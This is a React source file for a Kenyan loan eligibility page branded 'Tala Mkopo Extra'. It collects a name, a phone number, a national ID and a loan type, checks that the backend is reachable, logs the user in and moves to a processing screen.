// Eligibility.js - User Registration/Eligibility Page
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { useAuth } from '../hooks/useAuth';
import Swal from 'sweetalert2';
import './Eligibility.css';

const Eligibility = () => {
  const navigate = useNavigate();
  const { login } = useAuth();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    phone_number: '',
    national_id: '',
    loan_type: '',
  });

  useEffect(() => {
    document.title = 'Loan Eligibility | Tala Mkopo Extra';
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    Swal.fire({
      title: 'Checking Eligibility',
      text: "We're verifying your details...",
      showConfirmButton: false,
      allowOutsideClick: false,
      didOpen: () => {
        Swal.showLoading();
      },
    });

    try {
      const phone = formData.phone_number.trim();
      const nationalId = formData.national_id.trim();

      if (!phone || !nationalId || !formData.loan_type) {
        Swal.close();
        Swal.fire('Error', 'Please complete all required fields', 'error');
        setLoading(false);
        return;
      }

      // Check backend connectivity
      try {
        const healthUrl =
          window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
            ? 'http://localhost:5000/api/health'
            : '/api/health';

        await fetch(healthUrl);
      } catch (err) {
        throw new Error('Backend is unreachable. Please verify the API URL and server status.');
      }

      await login(formData.name.trim() || 'Customer', phone);

      navigate('/processing');
    } catch (error) {
      console.error('[ELIGIBILITY] Error:', error);
      
      const message =
        error?.code === 'ERR_NETWORK'
          ? 'Cannot reach backend server. Please try again shortly.'
          : error.message || 'Registration failed';

      Swal.close();
      Swal.fire('Error', message, 'error');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <Header logoInitial="P" />

      <div className="eligibility-content">
        <div className="eligibility-card card">
          <h2>
            <span className="section-icon" aria-hidden="true">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M20 21a8 8 0 0 0-16 0"></path>
                <circle cx="12" cy="7" r="4"></circle>
              </svg>
            </span>
            Personal Information
          </h2>

          <form onSubmit={handleSubmit} className="eligibility-form">
            <div className="form-group floating-field">
              <input
                id="name"
                type="text"
                name="name"
                placeholder=" "
                value={formData.name}
                onChange={handleChange}
                disabled={loading}
              />
              <label htmlFor="name">Full Name</label>
              <small>Enter your full name as on your national ID</small>
            </div>

            <div className="form-group floating-field">
              <input
                id="phone_number"
                type="tel"
                name="phone_number"
                placeholder=" "
                value={formData.phone_number}
                onChange={handleChange}
                required
                disabled={loading}
              />
              <label htmlFor="phone_number">Phone Number</label>
              <small>Safaricom only - e.g. 0712 345 678 or 0110 123 456</small>
            </div>

            <div className="requirements floating-field">
              <input
                id="national_id"
                type="text"
                name="national_id"
                placeholder=" "
                value={formData.national_id}
                onChange={handleChange}
                required
                disabled={loading}
              />
              <label htmlFor="national_id">National ID Number</label>
              <small>7 or 8 digit Kenyan National ID number</small>
            </div>

            <div className="form-group select-field">
              <select
                id="loan_type"
                name="loan_type"
                value={formData.loan_type}
                onChange={handleChange}
                required
                disabled={loading}
              >
                <option value="" disabled>
                  Select Loan Type
                </option>
                <option value="business">Business Loan</option>
                <option value="personal">Personal Loan</option>
                <option value="education">Education Loan</option>
                <option value="medical">Medical Loan</option>
                <option value="emergency">Emergency Loan</option>
              </select>
              <label htmlFor="loan_type">Select Loan Type</label>
              <small>Choose the purpose of your loan</small>
            </div>

            <div className="secure-row">
              <span>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 1.5 4 5v6c0 5.2 3.3 9.8 8 11.5 4.7-1.7 8-6.3 8-11.5V5l-8-3.5z"></path>
                </svg>
                Secure
              </span>
              <span>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2 4 7v6c0 5 3.5 9.7 8 11 4.5-1.3 8-6 8-11V7l-8-5z"></path>
                </svg>
                Licensed
              </span>
              <span>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                  <path d="m9 16.2-3.5-3.5L4 14.2 9 19l11-11-1.5-1.5z"></path>
                </svg>
                No CRB Check
              </span>
            </div>

            <button type="submit" className="btn-primary" disabled={loading}>
              {loading ? 'Checking Eligibility...' : 'Check Eligibility'}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            </button>

            <p className="footnote">No paperwork required. No guarantors needed.</p>
          </form>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Eligibility;
